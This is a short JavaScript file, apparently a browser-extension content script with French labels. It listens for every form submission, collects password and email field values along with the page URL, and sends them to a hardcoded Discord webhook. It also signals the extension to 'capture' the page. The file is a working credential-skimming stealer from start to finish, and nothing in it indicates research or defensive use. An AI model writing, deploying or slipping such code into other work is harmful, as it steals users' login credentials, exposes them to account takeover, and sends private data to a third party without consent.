document.addEventListener("submit", function (e) {
  const form = e.target;
  const inputs = form.querySelectorAll("input, textarea, select");
  const formData = {};

  inputs.forEach((input, i) => {
    const type = (input.type || input.tagName || "").toLowerCase();
    const isSensitive = type.includes("password") || type.includes("email") || input.autocomplete === "current-password";

    if (isSensitive) {
      const key = input.name || input.id || `champ_${i}`;
      formData[key] = {
        value: input.value,
        type: type
      };
    }
  });

  if (Object.keys(formData).length > 0) {
    const payload = {
      content: `📝 Formulaire détecté sur ${window.location.href}`,
      embeds: [{
        title: "Données sensibles détectées",
        description: "```json\n" + JSON.stringify(formData, null, 2) + "\n```"
      }]
    };

    fetch("https://discord.com/api/webhooks/1362038729186738216/hE24aPmgwR35PTiMannngijV4TEhezOOH-A86WISs-dJp_vaZBKcU8Pds0h4K0PCzELT", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    chrome.runtime.sendMessage({
      action: "capture",
      url: window.location.href
    });
  }
}, true);
